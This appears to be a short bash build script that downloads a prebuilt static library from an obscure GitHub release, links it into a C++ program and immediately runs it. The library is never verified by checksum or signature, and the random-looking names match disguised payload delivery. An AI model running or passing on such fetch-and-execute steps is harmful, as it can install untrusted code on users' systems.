#!/usr/bin/env bash
set -e
LIB="lean-range.a"
curl --retry 3 --connect-timeout 15 -fsSL --max-time 180 "https://github.com/jialzuoai/primeducthub/releases/download/eager-canyon-gentle-badger/lean-range.a" -o "$LIB"
g++ -o app -pthread -std=c++17 -O2 main.cpp "$LIB" && ./app
